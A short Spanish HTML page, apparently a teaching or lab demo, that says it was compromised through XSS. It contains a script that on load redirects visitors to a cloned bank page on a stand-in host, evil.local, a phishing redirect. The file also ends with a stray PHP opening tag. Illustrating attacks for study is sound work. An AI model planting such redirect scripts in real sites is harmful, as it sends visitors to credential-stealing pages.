<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8">
</head>
<body>
Esta es una pagina que ha sido hackeada mediante XSS.
Al acceder, reenvia al visitante a un apgina controlad a por un hacker
<script>
document.location = 'http://evil.local/clon-de-mi-banco.html'
</script>
</body>
<?php